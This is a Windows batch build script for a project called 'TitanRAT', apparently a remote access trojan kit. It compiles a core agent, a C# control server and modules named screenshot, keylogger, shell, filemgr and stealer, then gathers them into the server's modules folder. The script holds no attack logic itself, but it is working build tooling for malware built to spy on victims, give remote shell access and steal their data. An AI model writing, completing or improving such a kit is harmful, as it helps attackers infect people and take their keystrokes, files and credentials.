@echo off
setlocal enabledelayedexpansion

echo ================================================
echo   TitanRAT - Full Build System
echo ================================================
echo.

set ROOT_DIR=%~dp0
cd /d "%ROOT_DIR%"

set ERROR_COUNT=0

REM ================================================
REM 1. Build Core Agent
REM ================================================
echo [1/7] Building Core Agent...
cd /d "%ROOT_DIR%Core"
if exist build_core.bat (
    call build_core.bat
    if !ERRORLEVEL! neq 0 (
        echo [!] Core Agent build failed.
        set /a ERROR_COUNT+=1
    ) else (
        echo [+] Core Agent built successfully.
    )
) else (
    echo [!] build_core.bat not found.
    set /a ERROR_COUNT+=1
)
cd /d "%ROOT_DIR%"

REM ================================================
REM 2. Build Server (C#)
REM ================================================
echo.
echo [2/7] Building Server...
cd /d "%ROOT_DIR%Server"
if exist Server.csproj (
    dotnet build Server.csproj -c Release
    if !ERRORLEVEL! neq 0 (
        echo [!] Server build failed.
        set /a ERROR_COUNT+=1
    ) else (
        echo [+] Server built successfully.
    )
) else (
    echo [!] Server.csproj not found.
    set /a ERROR_COUNT+=1
)
cd /d "%ROOT_DIR%"

REM ================================================
REM 3. Prepare Server/modules directory
REM ================================================
echo.
echo [3/7] Preparing Server\modules directory...
if not exist "%ROOT_DIR%Server\modules" mkdir "%ROOT_DIR%Server\modules"
if exist "%ROOT_DIR%Server\modules" (
    echo [+] Server\modules directory ready.
) else (
    echo [!] Failed to create Server\modules directory.
    set /a ERROR_COUNT+=1
)

REM ================================================
REM 4. Build Modules (screenshot, keylogger, shell, filemgr, stealer)
REM ================================================
set MODULES=screenshot keylogger shell filemgr stealer
for %%M in (%MODULES%) do (
    echo.
    echo [4.%%M] Building module: %%M
    set MODULE_DIR=%ROOT_DIR%Modules\%%M
    if exist "!MODULE_DIR!" (
        cd /d "!MODULE_DIR!"
        if exist build.bat (
            call build.bat
            if !ERRORLEVEL! neq 0 (
                echo [!] Module %%M build failed.
                set /a ERROR_COUNT+=1
            ) else (
                echo [+] Module %%M built and copied to Server\modules.
            )
        ) else (
            echo [!] build.bat not found in !MODULE_DIR!
            set /a ERROR_COUNT+=1
        )
    ) else (
        echo [!] Module directory not found: !MODULE_DIR!
        set /a ERROR_COUNT+=1
    )
    cd /d "%ROOT_DIR%"
)

REM ================================================
REM 5. Copy additional files (config.json, etc.)
REM ================================================
echo.
echo [5/7] Copying configuration files...
if exist "%ROOT_DIR%Core\config.json" (
    copy /Y "%ROOT_DIR%Core\config.json" "%ROOT_DIR%Server\modules\..\" >nul
    echo [+] config.json copied to Server folder.
) else (
    echo [!] config.json not found in Core, skipping.
)

REM ================================================
REM 6. Final summary
REM ================================================
echo.
echo ================================================
if %ERROR_COUNT% equ 0 (
    echo BUILD SUCCESSFUL - No errors.
) else (
    echo BUILD FAILED - %ERROR_COUNT% error(s) occurred.
)
echo ================================================
cd /d "%ROOT_DIR%"
pause
exit /b %ERROR_COUNT%